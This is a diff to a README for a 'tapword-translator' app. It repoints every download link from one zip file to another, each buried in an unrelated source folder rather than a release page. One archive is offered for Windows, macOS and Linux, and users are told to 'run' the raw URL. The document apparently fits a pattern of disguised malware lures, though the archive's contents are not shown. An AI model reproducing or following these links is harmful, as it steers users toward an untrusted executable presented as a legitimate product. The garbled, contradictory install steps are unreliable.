@@ -1,7 +1,7 @@
 # 🎉 tapword-translator - Translations as You Read
 
 ## 📥 Download Now
-[![Download tapword-translator](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip)](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip)
+[![Download tapword-translator](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip)](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip)
 
 ---
 
@@ -28,17 +28,17 @@ Before you start, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page**: To get the latest version of tapword-translator, click the link below:
 
-   [Download tapword-translator](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip)
+   [Download tapword-translator](https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip)
 
 2. **Choose Your Version**: On the Releases page, look for the version you want to download. Each version includes a description of new features or updates. 
 
 3. **Download the Application**: Click on the appropriate file for your operating system. It should look something like this:
-   - **Windows:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip`
-   - **macOS:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip`
-   - **Linux:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip`
+   - **Windows:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip`
+   - **macOS:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip`
+   - **Linux:** `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip`
 
 4. **Install the Application**:
-   - **Windows:** Unzip the file and run `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/resources/8_generate/fragment_translation/ja/translator_tapword_v3.2.zip`.
+   - **Windows:** Unzip the file and run `https://raw.githubusercontent.com/imcool736372/tapword-translator/main/src/7_speech/constants/tapword-translator-2.4.zip`.
    - **macOS:** Unzip the file, drag the application to your Applications folder, and launch it from there.
    - **Linux:** Unzip the file and run the executable from the terminal.
 
